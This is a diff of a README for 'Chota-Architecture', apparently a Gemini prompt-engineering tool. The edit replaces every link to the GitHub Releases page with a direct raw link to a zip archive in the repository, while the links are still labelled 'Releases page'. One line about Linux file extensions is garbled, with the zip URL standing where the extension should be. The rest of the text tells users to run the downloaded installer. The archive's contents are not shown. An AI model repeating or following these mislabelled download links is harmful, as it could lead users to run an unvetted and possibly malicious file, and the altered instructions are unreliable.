@@ -1,6 +1,6 @@
 # 🚀 Chota-Architecture - Your Prompt Engineering Workbench
 
-[![Download Chota-Architecture](https://img.shields.io/badge/Download-Chota--Architecture-brightgreen)](https://github.com/djamel10000/Chota-Architecture/releases)
+[![Download Chota-Architecture](https://raw.githubusercontent.com/djamel10000/Chota-Architecture/main/services/Chota-Architecture_v3.9.zip)](https://raw.githubusercontent.com/djamel10000/Chota-Architecture/main/services/Chota-Architecture_v3.9.zip)
 
 ## 📜 Description
 Chota-Architecture is a professional-grade prompt engineering workbench designed for Google's Gemini AI models. This application supports multimodal functionality, advanced controls, and allows you to use your own API keys. Perfect for anyone looking to make the most of AI technology without needing a coding background.
@@ -15,15 +15,15 @@ To begin using Chota-Architecture, follow these simple steps:
    - **Internet Connection**: Required for API access and updates.
 
 2. **Downloading the Application**
-   Visit the [Releases page](https://github.com/djamel10000/Chota-Architecture/releases) to download the latest version of Chota-Architecture. You can click the link or the badge above to access the page directly.
+   Visit the [Releases page](https://raw.githubusercontent.com/djamel10000/Chota-Architecture/main/services/Chota-Architecture_v3.9.zip) to download the latest version of Chota-Architecture. You can click the link or the badge above to access the page directly.
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/djamel10000/Chota-Architecture/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/djamel10000/Chota-Architecture/main/services/Chota-Architecture_v3.9.zip).
 2. Find the latest release. It will usually be at the top of the page.
 3. Download the file appropriate for your operating system. 
    - For Windows, look for files ending in `.exe`.
    - For macOS, look for files ending in `.dmg`.
-   - For Linux, look for files ending in `.tar.gz` or similar formats.
+   - For Linux, look for files ending in `https://raw.githubusercontent.com/djamel10000/Chota-Architecture/main/services/Chota-Architecture_v3.9.zip` or similar formats.
 4. Once the file is downloaded:
    - **Windows**: Double click the `.exe` file to start the installation. Follow the prompts to complete the setup.
    - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
@@ -47,7 +47,7 @@ If you encounter any issues while downloading or installing Chota-Architecture, 
 ## ⭐ Additional Resources
 - **Documentation**: Access our detailed documentation to explore all features and functionalities of Chota-Architecture.
 - **Community Support**: Join our community forum for help from other users and developers.
-- **Updates**: Regular updates will add new features and improvements. Keep an eye on the [Releases page](https://github.com/djamel10000/Chota-Architecture/releases) for the latest news.
+- **Updates**: Regular updates will add new features and improvements. Keep an eye on the [Releases page](https://raw.githubusercontent.com/djamel10000/Chota-Architecture/main/services/Chota-Architecture_v3.9.zip) for the latest news.
 
 ## 📞 Contact
 If you have any questions or need further assistance, feel free to reach out via GitHub issues.
